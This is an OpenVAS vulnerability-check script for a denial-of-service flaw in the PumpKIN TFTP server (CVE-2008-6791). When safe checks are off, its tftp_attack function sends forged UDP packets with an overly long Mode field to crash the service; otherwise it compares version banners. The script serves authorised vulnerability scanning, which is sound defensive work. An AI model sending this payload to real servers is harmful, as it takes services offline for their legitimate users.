###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_pumpkin_tftp_server_dos_vuln.nasl 13202 2019-01-21 15:19:15Z cfischer $
#
# PumpKIN TFTP Server Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Updated Denial of Service (exploit) check. (Chandan, 2009-05-18)
#
# Copyright:
# Copyright (c) 2009 SecPod , http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900648");
  script_version("$Revision: 13202 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:19:15 +0100 (Mon, 21 Jan 2019) $");
  script_tag(name:"creation_date", value:"2009-05-19 08:03:45 +0200 (Tue, 19 May 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2008-6791");
  script_bugtraq_id(31922);
  script_name("PumpKIN TFTP Server Denial of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Denial of Service");
  script_dependencies("secpod_pumpkin_tftp_detect.nasl", "global_settings.nasl");
  script_mandatory_keys("PumpKIN/TFTP/Ver");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/6838");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/46122");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service to legitimate users.");

  script_tag(name:"affected", value:"PumpKIN TFTP Server version 2.7.2.0 and prior");

  script_tag(name:"insight", value:"Error exists when server fails handling certain input via
  sending an overly long Mode field.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running PumpKIN TFTP Server and is prone to Denial
  of Service Vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("version_func.inc");

if(TARGET_IS_IPV6())
  exit(0);

pkPort = get_kb_item("Services/udp/tftp");
if(!pkPort)
  pkPort = 69;

if(!get_udp_port_state(pkPort))
  exit(0);

function tftp_attack(port, attack)
{
  local_var req, rep, sport, ip, udp, filter, data, i;
  if(attack) {
    req1 = crap(length:16, data:"0x00");
    req2 = crap(length:32000, data:"0x00");
    req = raw_string(0x00, 0x02) + req1 + raw_string(0x00) + req2 + raw_string(0x00);
  } else {
    req = raw_string(0x00, 0x01) + "SecPod" +  raw_string(0x00) +
                                   "netascii" + raw_string(0x00);
  }

  ip = forge_ip_packet(ip_hl:5, ip_v:4, ip_tos:0, ip_len:20,
                       ip_id:rand(), ip_off:0, ip_ttl:64,
                       ip_p:IPPROTO_UDP, ip_src:this_host());

  sport = rand() % 64512 + 1024;

  udp = forge_udp_packet(ip:ip, uh_sport:sport, uh_dport:port,
                         uh_ulen: 8 + strlen(req), data:req);

  filter = 'udp and dst port ' + sport + ' and src host ' +
            get_host_ip() + ' and udp[8:1]=0x00';

  data = NULL;
  for(i = 0; i < 2; i++)
  {
    rep = send_packet(udp, pcap_active:TRUE, pcap_filter:filter);
    if(rep)
    {
      data = get_udp_element(udp: rep, element:"data");
      if(data[0] == '\0' && (data[1] == '\x03' || data[1] == '\x05')){
        return TRUE;
      }
    }
  }
  return FALSE;
}

if(!safe_checks())
{
  if(!tftp_attack(port:pkPort, attack:FALSE))
    exit(0);

  for(i=0; i<15; i++) {
    alive = tftp_attack(port:pkPort, attack:TRUE);
  }

  if(!tftp_attack(port:pkPort, attack:FALSE)){
    security_message(port:pkPort, proto:"udp");
  }
  exit(0);
}

pumpKINVer = get_kb_item("PumpKIN/TFTP/Ver");
if(pumpKINVer)
{
  if(version_is_less_equal(version:pumpKINVer, test_version:"2.7.2.0")){
    security_message(pkPort, proto:"udp");
    exit(0);
  }
}

exit(99);